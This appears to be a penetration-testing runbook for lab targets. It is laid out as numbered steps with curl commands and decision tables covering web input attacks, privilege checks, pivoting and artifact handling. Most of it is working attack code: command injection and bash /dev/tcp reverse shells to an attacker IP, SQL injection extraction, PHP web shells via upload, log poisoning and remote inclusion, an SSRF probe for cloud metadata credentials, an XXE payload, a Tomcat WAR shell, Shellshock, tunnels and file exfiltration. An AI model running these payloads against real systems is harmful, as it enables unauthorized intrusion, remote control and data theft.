# web_input

Start from the working request at WEB-06/08. Form stays POST: repeat every required field and a fresh CSRF value. For an existing session add `--header '@<HEADERS>'` only on the same origin.

## WREAD-01. Can a file-controlled input read an unintended local file?

Enter when the feature actually reads a named file.

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<ORDINARY_FILE>' -o baseline.body -w 'HTTP %{http_code}\n' '<URL>'
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=../../../../etc/passwd' -o probe.body -w 'HTTP %{http_code}\n' '<URL>'
sed -n '1,40p' probe.body | cat -v
```

For Windows handling use `..\..\..\..\Windows\win.ini`.

| Result | Next |
| --- | --- |
| File content, distinct from the baseline | **NET-05** for the config or service it names. |
| Reflected path or unchanged page | **WEB-06** for the real parameter context. |
| 403 with a verified identity | **NET-05**; no file sweep. |
| Transport or session failure | **WEB-09** / **PAUSE-COVERAGE**. |

## WEXEC-01. Does a POSIX command-backed input execute an extra command?

Enter when an ordinary value works and the argument looks unquoted.

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE>; printf OWB_%s <NONCE>' -o probe.body -w 'HTTP %{http_code}\n' '<URL>'
grep -F 'OWB_<NONCE>' probe.body
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE>; id' -o verify.body -w 'HTTP %{http_code}\n' '<URL>'
```

`;` rejected: retry once with a literal newline (`--data-urlencode $'...\nprintf OWB_%s <NONCE>'`).

| Result | Next |
| --- | --- |
| Marker plus real uid/gid | **WEXEC-04** if Bash is observed, otherwise **EXP-01**. |
| Reflected only, marker absent | **WEB-06** / **PAUSE-COVERAGE**. |
| Quoted argument context | **WEXEC-02**. |
| Windows cmd context | **WEXEC-03**. |

## WSQL-01. Does a numeric read-only query respond to Boolean SQL logic?

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<ID> AND 1=1' -o true.body -w 'HTTP %{http_code}\n' '<URL>'
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<ID> AND 1=2' -o false.body -w 'HTTP %{http_code}\n' '<URL>'
```

Ordinary and true must match, false must differ.

| Result | Next |
| --- | --- |
| Only false changes the result | **WSQL-03** for visible output, or **WSQL-06** for Boolean-only. |
| Error only | **WEB-06** / **PAUSE-COVERAGE**. |
| Nothing differs | Another field at **WEB-01**. |
| Single-quoted context observed | **WSQL-02**. |
| Session or rate limit | **WEB-09** / **PAUSE-COVERAGE**. |

## WSTORE-01. Does one observed stored-input flow persist an inert marker?

Enter only with a create request, a retrieval view and a known delete route.

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --request POST --data-urlencode '<field>=OWB_STORE_<NONCE>' -o create.body -w 'HTTP %{http_code}\n' '<CREATE_URL>'
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 -o view.body '<VIEW_URL>'
grep -F 'OWB_STORE_<NONCE>' view.body
```

Then use the observed delete/reset route and re-read the view; the marker must be gone.

| Result | Next |
| --- | --- |
| Appears after create, gone after cleanup | **NET-05**; persistence proven, not execution. |
| Never appears | **WEB-08** / **PAUSE-COVERAGE**. |
| Cleanup fails or marker remains | **PAUSE-RECOVERY**. |
| Session or rate limit | **WEB-09** / **PAUSE-COVERAGE**. |

# ftp_write

## FTP-03. Does one observed FTP write path accept and remove an inert file?

```bash
printf 'probe\n' | curl --disable --globoff -sS --fail --user '<USER>' --upload-file - 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
curl --disable --globoff -sS --fail --user '<USER>' -o probe.copy 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
curl --disable --globoff --list-only -sS --fail --user '<USER>' --quote '+DELE probe-<ID>.txt' 'ftp://<TARGET_IP>:<PORT>/<DIR>/'
rm probe.copy
```

| Result | Next |
| --- | --- |
| Upload, read and delete succeed | **NET-05**; not execution. |
| Write denied | **FTP-01** / **NET-05**. |
| Upload ok, read fails | Attempt cleanup, otherwise **PAUSE-RECOVERY**. |
| Delete denied or file remains | **PAUSE-RECOVERY**. |

# ftp_tls

## FTP-04. Does the observed FTP TLS endpoint give a verified listing?

Implicit FTPS:

```bash
curl --disable --globoff --path-as-is -sS --fail --ftp-pasv --cacert '<CA>' --resolve '<CERT_HOST>:<PORT>:<TARGET_IP>' --user '<USER>' -w 'TLS %{ssl_verify_result}\n' 'ftps://<CERT_HOST>:<PORT>/<DIR>/'
```

For STARTTLS use `--ssl-reqd` and `ftp://`.

| Result | Next |
| --- | --- |
| Verified TLS and listing | **FTP-02** in this TLS context. |
| Certificate failure | **PAUSE-ROUTE**; do not use `-k`. |
| TLS fails before auth | **NET-03**. |
| Login denied | **NET-05**. |

# smb_write

## SMB-03. Does one observed SMB write path accept and remove an inert file?

Enter when: SMB-02 read access works and write access is the question.

```bash
smbclient '//<TARGET_IP>/<SHARE>' -I '<TARGET_IP>' -p '<SMB_PORT>' -U '<DOMAIN_OR_SERVER>\<USERNAME>' --timeout 15
```

At the prompt, create, list, delete:

```text
ls
put /etc/hostname "probe-<RUN_ID>.txt"
ls "probe-<RUN_ID>.txt"
del "probe-<RUN_ID>.txt"
quit
```

| Result | Next |
| --- | --- |
| Write, read-back and delete all succeed | Record the writable path; **NET-05** or the application that consumes it. |
| Write denied | **NET-05**. Read access did not imply write. |
| Write succeeds, delete fails | Keep the path and go to **PAUSE-RECOVERY**. |
| Transport or identity error | **SMB-01**. |

# command_continuation

Enter only with known quoting and a safe original command. GET shown; for a form use `--request POST` and repeat required fields.

## WEXEC-02. Does the observed quoted POSIX argument permit extra execution?

Single-quoted argument:

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>'; printf OWB_%s <NONCE> #" -o probe.body '<URL>'
```

Double-quoted argument uses `'<field>=<VALUE>"; printf OWB_%s <NONCE> #'` instead. Then verify identity:

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>'; id; uname -s #" -o verify.body '<URL>'
sed -n '1,60p' verify.body | cat -v
```

| Result | Next |
| --- | --- |
| Marker plus real uid/gid | **WEXEC-05** if Bash and a route exist, otherwise **EXP-01**. |
| Reflected only | **WEB-06** / **PAUSE-COVERAGE**. |
| Rejected | **NET-05** with another context. |

## WEXEC-03. Does the evidenced Windows cmd argument execute another command?

Unquoted:

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE> & set /a 73190+7 & rem ' -o probe.body '<URL>'
```

Double-quoted uses `'<field>=<VALUE>" & set /a 73190+7 & rem '`. Then:

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE> & whoami & ver & rem ' -o verify.body '<URL>'
sed -n '1,60p' verify.body | cat -v
```

| Result | Next |
| --- | --- |
| `73197`, then Windows identity and version | **EXP-01**; **WIN-01** only with a real shell. |
| Reflected only | **WEB-08** / **PAUSE-COVERAGE**. |
| Quoting differs | **NET-05** with another lead. |

# command_shell

Enter after WEXEC-01/02 proved execution and you know the Bash path and quote context.

## WEXEC-04. Can verified unquoted Linux command input provide a usable shell?

Listener first:

```bash
ncat --listen --verbose --nodns '<KALI_IP>' '<PORT>'
```

Then trigger:

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE>; <BASH> -c "exec <BASH> -i >/dev/tcp/<KALI_IP>/<PORT> 2>&1 <&1"; #' -o delivery.body '<URL>'
```

In the shell: `hostname; id; uname -srm; pwd`.

| Result | Next |
| --- | --- |
| Assigned host and identity | **EXP-03**, then **LNX-01**. |
| Connection, no output | **PAUSE-COVERAGE**. |
| No connection | **PAUSE-COVERAGE**; stop the listener. |
| Wrong host | **PAUSE-ROUTE**. |

## WEXEC-05. Can verified quoted Linux command input provide a usable shell?

Single-quoted carrier:

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>'; <BASH> -c \"exec <BASH> -i >/dev/tcp/<KALI_IP>/<PORT> 2>&1 <&1\"; #" -o delivery.body '<URL>'
```

Double-quoted uses `<field>=<VALUE>"; <BASH> -c "exec ..."; #`. Verify as in WEXEC-04.

| Result | Next |
| --- | --- |
| Assigned host and identity | **EXP-03**, then **LNX-01**. |
| No output / no connection | **PAUSE-COVERAGE**. |
| Wrong host | **PAUSE-ROUTE**. |

# sql_continuation

Enter with a calibrated true/false channel and known quote context.

## WSQL-02. Does a known single-quoted lookup interpret paired conditions?

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>' AND '1'='1" -o true.body '<URL>'
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>' AND '1'='2" -o false.body '<URL>'
```

| Result | Next |
| --- | --- |
| True matches, false differs | **WSQL-03**, or **WSQL-06** without visible output. |
| No difference | **WEB-06** / **PAUSE-COVERAGE**. |

## WSQL-03. What UNION width and displayed type actually work?

Write one `NULL` per column; start at the candidate width:

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<UNUSED> UNION ALL SELECT NULL,NULL,NULL -- " -o width.body '<URL>'
```

Replace one `NULL` with `'owb-text'` (text) or `73190+7` (numeric) once the width holds.

| Result | Next |
| --- | --- |
| Text appears in a result column | **WSQL-04**. |
| Column-count error | Retry one other width, then **PAUSE-COVERAGE**. |
| Conversion error | Try the other type once. |

## WSQL-04. Which engine/context and one justified row can this slot return?

Pick the engine expression:

| Engine | Version | Database |
| --- | --- | --- |
| MySQL/MariaDB | `version()` | `DATABASE()` |
| PostgreSQL | `version()` | `current_database()` |
| SQL Server | `@@VERSION` | `DB_NAME()` |
| SQLite | `sqlite_version()` | `main` |

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<UNUSED> UNION ALL SELECT NULL,sqlite_version(),NULL -- " -o engine.body '<URL>'
```

Then read one row: `(SELECT <column> FROM <table> WHERE <key>=<ID>)` in the same slot.

| Result | Next |
| --- | --- |
| Engine and value visible | Matching application decision. |
| Table or key unknown | **WSQL-05**. |
| Multiple rows or NULL | **PAUSE-COVERAGE**. |

## WSQL-05. Which next table or column name is visible in this namespace?

One name per request, cursor starts empty:

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<UNUSED> UNION ALL SELECT NULL,(SELECT MIN(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name>''),NULL -- " -o table.body '<URL>'
```

For columns: `(SELECT MIN(name) FROM pragma_table_info('<TABLE>') WHERE name>'<CURSOR>')`.

| Result | Next |
| --- | --- |
| Table or column name | **WSQL-04** with that name. |
| NULL | **PAUSE-COVERAGE**; budget exhausted is not absence. |

## WSQL-06. Can one chosen scalar be verified through Boolean-only output?

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<ID> AND (length((SELECT <COLUMN> FROM <TABLE> WHERE <KEY>=<ID>))=<N>)" -o length.body '<URL>'
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<ID> AND (unicode(substr((SELECT <COLUMN> FROM <TABLE> WHERE <KEY>=<ID>),<POS>,1))=<CODE>)" -o char.body '<URL>'
python3 -c 'import sys; print(chr(int(sys.argv[1])))' '<CODE>'
```

| Result | Next |
| --- | --- |
| Length and characters confirm | Record the scalar; not a credential by itself. |
| False at a step | **PAUSE-COVERAGE**. |
| Channel unstable | **WEB-09**. |

# web_upload

Test only new files. Keep the exact file field, required fields, record view and delete action.

## WUPLOAD-01. Where did one ordinary uploaded file land?

```bash
printf 'OWB_UPLOAD_<NONCE>\n' > marker.txt
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --form '<field>=@marker.txt;filename=owb-<NONCE>.txt;type=text/plain' -o upload.body -w 'HTTP %{http_code}\n' '<UPLOAD_URL>'
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 -o read.body '<FILE_URL>'
cmp marker.txt read.body
```

| Result | Next |
| --- | --- |
| Exact bytes at the file URL | **WUPLOAD-02** if PHP is justified. |
| Record created, file unreadable | **WEB-08**. |
| Served as download | **WEB-08**; no handler. |
| Login or CSRF error | **WEB-09**. |

Delete through the app and re-request the URL. 404 alone is not proof.

## WUPLOAD-02. Does an uploaded PHP file execute, and can it open one lab shell?

Generate the reviewed proof file (identity, fixed callback, self-remove) with the [local artifact generator](../../../scripts/make-lab-upload-proof.py):

```bash
python3 '<make-lab-upload-proof.py>' './upload-php' '<KALI_IP>' '<PORT>'
cat './upload-php/name.txt'
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --form '<field>=@./upload-php/proof.php;filename=<NAME>;type=application/octet-stream' -o upload.body -w 'HTTP %{http_code}\n' '<UPLOAD_URL>'
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --header '@./upload-php/action.headers' --data-urlencode 'mode=proof' -o proof.body -w 'HTTP %{http_code}\n' '<FILE_URL>'
```

For an image-only filename gate, send the same bytes with `type=image/jpeg`.

| Result | Next |
| --- | --- |
| `executed` with host, `id` and exit 0 | Choose cleanup or the callback. |
| PHP source returned | **WEB-08**; delete the upload. |
| Rejected filename or MIME | **WEB-08** / **PAUSE-COVERAGE**. |
| Missing process function | **PAUSE-COVERAGE**. |

Callback: `ncat --listen '<KALI_IP>' '<PORT>' --verbose`, then request `mode=callback`. In the shell: `hostname; id; pwd`. Verify with **EXP-03**, then **LNX-01**. Cleanup with `mode=cleanup` or the UI, then delete the exact local files.

# web_editor

## WEDIT-01. Does this authorized existing template execute PHP, then restore cleanly?

Enter with an evidenced Linux/PHP app, a verified editor session and one peripheral template. Record theme, file, editor URL and trigger URL. Keep a tested reset path.

Capture the original and prove the ordinary trigger before editing:

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --header '@<HEADERS>' -o before.html '<EDITOR_URL>'
python3 '<copy-lab-editor-source.py>' before.html original.php '<THEME>' '<FILE>'
sha256sum original.php
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 -o baseline.body '<TRIGGER_URL>'
```

Generate a proof with self-delete off, paste it into the editor, save once, re-read the editor and compare:

```bash
python3 '<make-lab-upload-proof.py>' './editor-proof' '<KALI_IP>' '<PORT>' --existing-file
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --header '@<HEADERS>' -o edited.html '<EDITOR_URL>'
python3 '<copy-lab-editor-source.py>' edited.html edited.php '<THEME>' '<FILE>'
cmp proof.php edited.php
```

Send one proof request:

```bash
curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --header '@./editor-proof/action.headers' --data 'mode=proof' -o proof.body '<TRIGGER_URL>'
```

Restore before closing: paste `original.php` back, save once, re-read, compare with `original.php`, and confirm the ordinary page returns.

| Result | Next |
| --- | --- |
| Marker, assigned host and real `id` | **EXP-03**, then **LNX-01** if a shell is needed. |
| Raw PHP or unchanged page | **PAUSE-COVERAGE** after restore. |
| Save rejected or source mismatch | **PAUSE-RECOVERY**. |
| Restore mismatch or broken page | **PAUSE-RECOVERY** with the out-of-band route. |

# web_advanced

Each task needs a verified input or endpoint from WEB-06/08/12.

## WEB-13. Can a file parameter reach source or logs?

```bash
curl -sS '<URL>?<FIELD>=php://filter/convert.base64-encode/resource=index.php' | base64 -d
curl -sS -A '<?php system($_GET["c"]); ?>' '<URL>'
curl -sS '<URL>?<FIELD>=/var/log/apache2/access.log&c=id'
```

The first reads source; the second writes PHP into the access log; the third executes it. Use the real log path if Apache differs.

| Result | Next |
| --- | --- |
| Source or `uid=` output | **EXP-01** for a shell path, or **WEB-13** again for another file. |
| Base64 decodes to PHP | Read `config.php` and similar files. |
| Log path wrong | Try `/var/log/nginx/access.log`, then **PAUSE-COVERAGE**. |
| Filter disabled | Plain traversal at **WREAD-01**. |

## WEB-14. Can the parameter include a remote file?

Host a PHP shell on Kali:

```bash
printf '<?php system($_GET["c"]); ?>' > shell.php
python3 -m http.server 80
```

```bash
curl -sS '<URL>?<FIELD>=http://<KALI_IP>/shell.php&c=id'
```

| Result | Next |
| --- | --- |
| `uid=` output | **EXP-01**, then **SHELL-01**. |
| Source echoed only | Handler not parsing; **WEB-13**. |
| Connection blocked | **PAUSE-COVERAGE**; allow `allow_url_include`. |

## WEB-15. Does the server fetch a URL you choose?

```bash
curl -sS '<URL>?<FIELD>=http://127.0.0.1:<PORT>/'
curl -sS '<URL>?<FIELD>=http://169.254.169.254/latest/meta-data/'
```

Use a listener (`nc -lvnp <PORT>`) to confirm a callback.

| Result | Next |
| --- | --- |
| Internal response or callback | **NET-05** on the internal port, or **PIVOT-01**. |
| Only a generic page | **PAUSE-COVERAGE**; try `gopher://`, `file://` once. |
| Cloud metadata | Read credentials from the returned JSON. |

## WEB-16. Does an XML endpoint resolve external entities?

```bash
cat > xxe.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
EOF
curl -sS -X POST -H 'Content-Type: application/xml' --data-binary @xxe.xml '<URL>'
```

| Result | Next |
| --- | --- |
| File content in the response | **WEB-13** for source, **NET-05** for config. |
| No expansion | **PAUSE-COVERAGE**; check the parser and content type. |

## WEB-17. Is access control or a default credential the gap?

```bash
curl -sS -i '<URL>?id=1'
curl -sS -i '<URL>?id=2'
curl -sS -i -u 'admin:admin' '<URL>'
curl -sS -i -H 'X-Forwarded-For: 127.0.0.1' '<URL>/admin'
```

| Result | Next |
| --- | --- |
| Another record with a different owner | IDOR; collect the useful object. |
| Default credential works | **WEB-09** for the account view. |
| Header bypasses the restriction | Record the header; continue at **WEB-09**. |
| All denied | **WEB-04** for another path. |

## WEB-18. Is a Tomcat manager exposed?

```bash
curl -sS -i 'http://<TARGET>:<PORT>/manager/html'
msfvenom -p java/jsp_shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<PORT>' -f war -o shell.war
curl -sS -u 'tomcat:tomcat' --upload-file shell.war 'http://<TARGET>:<PORT>/manager/text/deploy?path=/shell'
curl -sS 'http://<TARGET>:<PORT>/shell/'
```

| Result | Next |
| --- | --- |
| Deploy accepted and callback | **EXP-03**, then **WIN-01** or **LNX-01**. |
| 401 | Try `tomcat:tomcat`, `admin:admin` once each. |
| No manager | **WEB-04** for another path. |

## WEB-19. Is a CGI script vulnerable to Shellshock?

```bash
curl -sS -i -H 'User-Agent: () { :; }; /bin/bash -c "id"' 'http://<TARGET>/cgi-bin/<SCRIPT>'
```

| Result | Next |
| --- | --- |
| `uid=` in the headers/body | **EXP-01** for a Bash callback. |
| No output | Try another script from WEB-04. |
| 500 only | **PAUSE-COVERAGE**. |
# access

## EXP-01. Does one candidate fit the observed endpoint and context?

Compare the candidate with the exact product/version, the function you reached, OS and process architecture, required configuration or input, callback route, payload constraints, and recovery. A title or banner match is not applicability.

| Result | Next |
| --- | --- |
| All facts supported and the procedure reviewed | **EXP-02**. |
| No local candidate, other service available | **NET-05**. |
| No candidate, no other service | **PAUSE-COVERAGE**. |
| One prerequisite missing | Answer it at **NET-03**, **WEB-03** or **LNX-01**. |
| Unsupported artifact or no recovery | **GAP-ACCESS**. |
| Candidate needs delivery to the target | **XFER-01**. |
| Route conflict | **PAUSE-ROUTE**. |

## EXP-02. What did one reviewed attempt actually produce?

Start the reviewed listener or observation point, run the one attempt, and keep the raw output. Tool text such as `sent` is not execution.

For an expected Linux shell:

```bash
hostname
id
uname -s
```

For Windows cmd: `hostname; whoami; ver`.

| Result | Next |
| --- | --- |
| New attributable session | **EXP-03** in that session. |
| Callback with real host/identity | **EXP-03**. |
| Connection, no command output | **GAP-ACCESS**. |
| Service still answers, no session | **NET-05** or **EXP-01** with one changed fact. |
| Service crashed | **PAUSE-RECOVERY**. |

## EXP-03. Is the session actually on the assigned host with a known identity?

Linux:

```bash
hostname
id
uname -srm
pwd
```

Windows: `hostname; whoami; ver`.

| Result | Next |
| --- | --- |
| Host and identity match | **LNX-01** / **WIN-01**. |

Windows token work continues at [WIN-01](./win-01.md).
| Wrong host or a Kali prompt | **PAUSE-ROUTE**. |
| Some checks denied | **GAP-ACCESS** if unattributable. |
| Container suspected | **LNX-02**. |

# shell_transfer

## SHELL-01. Can an existing socket shell become a usable target PTY?

Enter after EXP-03, from a foreground socket client with local job control.

On the target:

```bash
python3 -c 'import pty; pty.spawn(["/bin/bash", "--noprofile", "--norc"])'
tty
```

Press Ctrl-Z once to return to Kali, then:

```bash
stty -g
stty size
stty raw -echo && fg '%1'; stty '<SAVED_MODE>'
```

In the target: `export TERM=xterm-256color; stty rows '<ROWS>' cols '<COLS>'`.

| Result | Next |
| --- | --- |
| PTY and line editing work | **LNX-01**. |
| No Python or job control | **PAUSE-COVERAGE**. |
| Restricted shell with Vim available | **SHELL-02**. |
| Local tty broken | `stty sane` on that tty, then **PAUSE-RECOVERY**. |

## SHELL-02. Can an available Vim open a usable same-user shell?

```bash
command -v vi vim
vi -N -u NONE -n -i NONE
```

In Vim: `:set shell=/bin/bash`, `:shell`. In the child: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; id`.

| Result | Next |
| --- | --- |
| Unrestricted Bash and expected identity | **LNX-01**. |
| Still restricted | **PAUSE-COVERAGE**. |
| Identity unclear | **EXP-03**. |

Exit the child, then `:q!` in Vim.

## XFER-01. Can one reviewed local file reach the target without replacement?

Kali, one shell:

```bash
cp -- '<FILE>' ./artifact.bin
sha256sum artifact.bin; wc -c < artifact.bin
python3 -m http.server '<PORT>' --bind '<KALI_IP>'
```

Target:

```bash
curl --fail -sS -o /tmp/artifact.bin 'http://<KALI_IP>:<PORT>/artifact.bin'
sha256sum /tmp/artifact.bin
```

| Result | Next |
| --- | --- |
| Hash matches | Return to the task that needs the file; EXP-01 must already be done. |
| Partial or mismatch | Delete it, **PAUSE-COVERAGE**. |
| No client or writable path | **PAUSE-COVERAGE**. |

Stop the server with Ctrl-C and delete both copies afterwards.

## XFER-02. Can one selected sensitive file return to Kali over verified SSH?

Target:

```bash
stat -c '%s %n' -- '<FILE>'; sha256sum -- '<FILE>'
```

Kali:

```bash
scp -P '<SSH_PORT>' -i '<KEY>' -o StrictHostKeyChecking=yes -o 'UserKnownHostsFile=<KNOWN_HOSTS>' '<USER>@<TARGET_IP>:<FILE>' ./artifact.bin
sha256sum ./artifact.bin
```

| Result | Next |
| --- | --- |
| Size and hash match | Return to the initiating task. |
| Denied, interrupted or mismatch | **PAUSE-COVERAGE**. |

Keep the local copy at 0600 and delete it after use.

# pivoting

Reach one internal service through a host you already control.

## PIVOT-01. Can SSH forward the needed port?

Local forward to a service on the pivot's network:

```bash
ssh -N -L '<LOCAL_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>' '<USER>@<PIVOT_IP>'
```

Remote forward when the pivot cannot reach Kali directly:

```bash
ssh -N -R '<KALI_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>' '<USER>@<PIVOT_IP>'
```

| Result | Next |
| --- | --- |
| Port answers locally | The matching service task at `127.0.0.1:<LOCAL_PORT>`. |
| Forward refused | Check `AllowTcpForwarding`; **PIVOT-02** instead. |
| Auth denied | **SSH-01**. |

## PIVOT-02. Can a non-SSH tunnel carry the port?

Chisel reverse tunnel from the pivot:

```bash
chisel server --reverse --port '<KALI_PORT>'
./chisel client 'http://<KALI_IP>:<KALI_PORT>' 'R:<LOCAL_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>'
```

Or one-shot socat:

```bash
socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<INTERNAL_HOST>:<INTERNAL_PORT>
```

| Result | Next |
| --- | --- |
| Local port answers | Service task through `127.0.0.1`. |
| Tunnel works, internal range needs scanning | **PIVOT-03**. |
| Client cannot egress | Try 443/80 outbound or **PAUSE-COVERAGE**. |
| Tunnel drops | Keep the command output; **PAUSE-RECOVERY**. |

## PIVOT-03. Can the internal range be scanned through the pivot?

```bash
printf 'socks5 127.0.0.1 <SOCKS_PORT>\n' > proxychains.conf
proxychains -f proxychains.conf nmap -sT -Pn -p 22,80,139,443,445,3389 '<INTERNAL_SUBNET>'
```

Use `-sT`; SYN scans do not traverse a proxy cleanly.

| Result | Next |
| --- | --- |
| Live internal hosts and ports | **NET-05** on that host through the same tunnel. |
| Only timeouts | Confirm the tunnel with one known port first. |
| Partial results | **PAUSE-COVERAGE**. |
# local_artifact

## ART-01. Does this exact downloaded file contain a usable next lead?

```bash
file -- '<COPY>'
sha256sum -- '<COPY>'
strings -a -n 6 -- '<COPY>' | head -n 80 | cat -v
```

Format-specific checks, only when the type justifies them:

```bash
exiftool -- '<COPY>'
binwalk -- '<COPY>'
ssh-keygen -lf '<COPY>' -E sha256
zipinfo -l '<COPY>' | sed -n '1,80p'
```

| Result | Next |
| --- | --- |
| Clear text with an account or service | Follow that service task. |
| Encoded or embedded candidate | Decode into a fresh directory, then **ART-01** on the result. |
| Relevant ZIP member | **ART-02**. |
| Encrypted member | **ART-03** if offline recovery is permitted. |
| Private key | **SSH-01** with an observed endpoint and account. |
| Wrong steghide passphrase | One other evidenced candidate, then **PAUSE-COVERAGE**. |
| Unreadable or attributed wrong | **PAUSE-COVERAGE**. |

## ART-02. What does one selected ZIP member actually contain?

```bash
python3 '<read-lab-zip-member.py>' --archive '<ZIP>' --member '<MEMBER>' --output '<OUT>'
head -c 8192 -- '<OUT>' | cat -v
```

Add `--password-prompt` for a traditional-encrypted member with a known passphrase.

| Result | Next |
| --- | --- |
| Account or service clue | The matching service task. |
| Private key | **ART-01** for the fingerprint. |
| Unsupported or unsafe member | **PAUSE-COVERAGE** / **GAP-ACCESS**. |
| Bad passphrase | **ART-03** if recovery is permitted. |

## ART-03. Can one permitted offline wordlist recover this ZIP member's passphrase?

```bash
zip2john -o '<MEMBER>' '<ZIP>' > archive.hash
john --format=pkzip --wordlist='<WORDLIST>' --rules=none --max-run-time=<SECONDS> archive.hash
john --show --format=pkzip archive.hash
```

| Result | Next |
| --- | --- |
| Candidate recovered | **ART-02** with it; only a full member read confirms. |
| List exhausted | **NET-05** or **PAUSE-COVERAGE**. |
| Interrupted | **PAUSE-COVERAGE**; no automatic resume. |
| Format unsupported | **GAP-ACCESS**. |

# linux

## LNX-01. Which host and effective identity are you using?

For a direct entry or a changed shell, run the full check in the target shell:

```bash
hostname
id
uname -s
pwd
```

If SSH-02 or EXP-03 already recorded host, identity and Linux OS in this same
still-open shell, reuse those results and run only:

```bash
pwd
```

Do not reuse the earlier observations after the account, shell or target changes.

If the assigned objective names an exact file that this identity should read,
read it in this attributed shell and keep its value in private adventure
evidence:

```bash
cat -- '<EXACT_ASSIGNED_OBJECTIVE_FILE>'
```

Show the target address in the same shell only if the exercise requires it:

```bash
ip -4 addr
```

| Result                                                                                               | Next action                                                                                                                                                      |
| ---------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host corroborates assignment; exact objective file content is read                                   | Keep value, host and identity in private evidence. If host work continues, return to **LNX-03**. Do not infer proof from the username or search unrelated homes. |
| Host corroborates assignment; ordinary non-root identity/OS visible, but no exact objective is ready | Keep host, identity and groups; **LNX-03** for sudo. No routine namespace dump.                                                                                  |
| Effective UID 0                                                                                      | Still **LNX-02**. Container/chroot root is not automatically target-host root or objective proof.                                                                |
| Different host or local Kali shell                                                                   | **PAUSE-ROUTE**, resolve session attribution before host work.                                                                                                   |
| Restricted shell, container clues or unexpected identity/execution behavior                          | **LNX-02** for the relevant boundary, then return to host review.                                                                                                |
| Missing command/denied file                                                                          | Keep the missing fact. Adequate host/identity attribution goes to **LNX-03**; otherwise **EXP-03**.                                                              |

## LNX-02. Is this process restricted or in a separate namespace?

Open only for UID 0, restriction/container clues, or a privilege mechanism whose
behavior needs these fields. Ordinary non-root entry goes directly to LNX-03.
Run only the check that answers the current boundary question. For a restricted
command path, inspect this shell's flags:

```bash
printf 'Shell: %s\nFlags: %s\n' "$0" "$-"
```

For current UID, capability or process restrictions:

```bash
grep -E '^(Uid|Gid|Groups|CapEff|CapBnd|NoNewPrivs|Seccomp|NSpid):' "/proc/$$/status"
```

For an observed container or remapped-UID clue, inspect this process's
namespace/cgroup context:

```bash
cat "/proc/$$/cgroup"
readlink "/proc/$$/ns/user" "/proc/$$/ns/mnt" "/proc/$$/ns/pid"
cat "/proc/$$/uid_map"
```

| Result                                                                            | Next action                                                                                                              |
| --------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| Ordinary non-root host context sufficiently corroborated                          | **LNX-03** for delegated commands.                                                                                       |
| Restricted command path, available Vim and known Bash on the attributed Linux lab | **SHELL-02** for same-user editor recovery. A missing command is not sudo denial or a privilege result.                  |
| UID 0 and assigned-host boundary sufficiently corroborated                        | Read only the exact assigned objective in this shell if one applies. Root alone is not proof of completion.              |
| Remapped UID, container/runtime indicators or unusual mount context               | Record the actual boundary; **LNX-03** inside that context. Host escape remains a distinct hypothesis at **GAP-ACCESS**. |
| Seccomp/NoNewPrivs/capability restrictions                                        | Record fields and inspect concrete rights at **LNX-03** and **LNX-05**; do not assume every execution method works.      |
| `/proc` unavailable/denied                                                        | Keep uncertainty; **LNX-03** with the restriction recorded. No automatic namespace escape.                               |

## LNX-03. What exact commands are delegated to this user?

```bash
sudo -n -l
```

